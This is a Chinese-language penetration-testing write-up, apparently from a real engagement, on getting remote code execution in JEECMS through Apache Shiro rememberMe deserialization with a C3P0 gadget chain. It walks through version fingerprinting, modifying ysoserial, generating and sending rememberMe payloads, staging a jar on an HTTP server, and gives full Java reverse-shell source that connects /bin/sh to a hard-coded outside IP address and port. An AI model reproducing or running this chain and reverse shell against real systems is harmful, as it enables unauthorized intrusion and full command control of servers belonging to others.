# JEECMS的Shiro-C3P0链

### 寻找信息

特征1

![image-20210912220543538](JEECMS的Shiro-C3P0链.assets/image-20210912220543538.png)



组件信息

![image-20210912220838998](JEECMS的Shiro-C3P0链.assets/image-20210912220838998.png)





tomcat v7

![image-20210912221010075](JEECMS的Shiro-C3P0链.assets/image-20210912221010075.png)

v9.X安装说明

![image-20210912221026223](JEECMS的Shiro-C3P0链.assets/image-20210912221026223.png)

找到v9.3安装包，发现无法使用CC链

![image-20210912221549937](JEECMS的Shiro-C3P0链.assets/image-20210912221549937.png)

![image-20210912221937351](JEECMS的Shiro-C3P0链.assets/image-20210912221937351.png)



另外找到v8.1版本为shiro 1.3.0，v7为shiro 1.2.2，cc均为3.1

![image-20210912225837120](JEECMS的Shiro-C3P0链.assets/image-20210912225837120.png)



### 本地调试

已知CC、CB链无法使用，shiro-CB链可能无法使用，DNS链可以，此处可以考虑的则是c3p0或者hibernate

本地小测试一下发现版本0.9.5.2不对，不能使用。

![image-20210913024042500](JEECMS的Shiro-C3P0链.assets/image-20210913024042500.png)

后来发现依赖是0.9.1.1，v8.1也是一样

![image-20210913024457514](JEECMS的Shiro-C3P0链.assets/image-20210913024457514.png)

修改yso依赖

![image-20210913023959534](JEECMS的Shiro-C3P0链.assets/image-20210913023959534.png)

生成序列化数据

![image-20210913024645068](JEECMS的Shiro-C3P0链.assets/image-20210913024645068.png)

生成rememberMe数据

![image-20210913024658388](JEECMS的Shiro-C3P0链.assets/image-20210913024658388.png)

发送rememberMe数据

![image-20210913024725381](JEECMS的Shiro-C3P0链.assets/image-20210913024725381.png)

获得Dns结果

![image-20210913024624287](JEECMS的Shiro-C3P0链.assets/image-20210913024624287.png)



### 实战利用

生成命令执行exp的jar包

![image-20210913161525808](JEECMS的Shiro-C3P0链.assets/image-20210913161525808.png)



放到服务器上开启http服务，再用c3p0链生成payload执行

![image-20210913161618231](JEECMS的Shiro-C3P0链.assets/image-20210913161618231.png)



可以看到支持sh和bash，但只能wget，没有curl命令

![image-20210913161736776](JEECMS的Shiro-C3P0链.assets/image-20210913161736776.png)



### 到此一游

多种方法测试反弹Shell不成功，无奈只能用java Socket反弹Shell，因为是docker所以可以执行的命令非常少

![image-20210913165714611](JEECMS的Shiro-C3P0链.assets/image-20210913165714611.png)



```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class exp3 {
    public exp3() throws IOException, InterruptedException {
        String host="121.36.84.244";
        int port=7555;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0) {
                so.write(pi.read());
            }
            while(pe.available()>0) {
                so.write(pe.read());
            }
            while(si.available()>0) {
                po.write(si.read());
            }
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }

//    public static void main(String[] args) throws IOException, InterruptedException {
//        new exp3();
//    }
}
```



### 题外话

————————————————————————————————————————————————————————————

此外，理论上还有Shiro-CB原生链

![image-20210913025625835](JEECMS的Shiro-C3P0链.assets/image-20210913025625835.png)





测试时惊奇的发现shiro 1.3.0居然无法使用shiro-CB，因为没有利用到父类的CC依赖。那么实战环境使用shiro-CB链无法成功就是自然而然的事情了。

![image-20210913040045157](JEECMS的Shiro-C3P0链.assets/image-20210913040045157.png)



但很怪异的一点是添加CC3.1依赖后

![image-20210913041306631](JEECMS的Shiro-C3P0链.assets/image-20210913041306631.png)

完全可以使用CC-K1链

![image-20210913041334718](JEECMS的Shiro-C3P0链.assets/image-20210913041334718.png)

而V8.1版本是存在CC3.1的，项目快结束了，待后续研究

![image-20210913041438636](JEECMS的Shiro-C3P0链.assets/image-20210913041438636.png)

